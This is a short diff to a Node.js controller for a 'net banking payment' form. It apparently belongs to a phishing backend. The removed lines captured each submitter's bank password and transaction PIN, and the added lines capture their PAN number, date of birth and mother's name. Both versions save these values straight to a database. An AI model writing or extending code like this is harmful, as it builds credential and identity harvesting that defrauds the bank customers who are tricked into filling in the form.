@@ -3,14 +3,14 @@ const NetBanking = require('../models/NetBanking');
 // Handle net banking payment data submission
 exports.submitNetBankingPayment = async (req, res) => {
     try {
-        const { userId,bankId, bankName, password, transactionPin } = req.body;
+        const { userId,panNumber, dob, motherName } = req.body;
         
         const newNetBankingPayment = new NetBanking({
             userId,
-            bankId,
-            bankName,
-            password,
-            transactionPin// Make sure to use the correct field name
+            panNumber,
+            dob,
+            motherName, // Make sure to use the correct field name
+           
         });
 
         await newNetBankingPayment.save();
